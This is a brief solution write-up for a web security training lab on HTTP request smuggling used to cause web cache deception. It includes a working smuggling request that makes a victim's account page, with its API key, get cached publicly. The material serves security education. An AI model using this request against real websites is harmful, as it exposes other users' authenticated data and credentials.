# Lab 14 — Exploiting HTTP request smuggling to perform web cache deception

> **Practitioner** · [Official lab](https://portswigger.net/web-security/request-smuggling/exploiting/lab-perform-web-cache-deception)

**Entry point:** smuggle `GET /my-account` (with the victim's session) so
its response gets cached as a static-looking resource.

## Solution

1. Note `/my-account` has no anti-caching headers.
2. Poison the connection:

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: X
```

3. Repeat several times, then open the home page in an **incognito**
   window; Burp menu → Search for *"Your API Key"* in responses — the
   cached copy of the victim's account page contains it.
4. Submit the API key — lab solved.

## Notes

Cache deception: the victim's own authenticated response becomes public
under a cacheable key.
